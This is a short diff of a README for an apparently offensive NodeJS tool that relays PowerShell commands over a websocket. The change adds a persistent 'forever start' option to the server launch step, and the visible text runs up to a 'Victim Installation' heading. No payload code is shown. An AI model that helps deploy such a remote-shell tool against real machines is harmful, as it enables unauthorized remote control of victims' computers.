@@ -19,7 +19,7 @@ This is a NodeJS server with the ability to pass through Powershell commands to 
  2. Create a NodeJS environment with Websocket package
  3. Copy files from the repo into your environment
  4. Check the settings & change password in the config file
- 5. Start your node server: "node index.js"
+ 5. Start your node server: "node index.js" or "forever start index.js"
  6. Goto "http://[server_ip]:3395/shell.socket" in browser & enter password
 
 ## Victim Installation
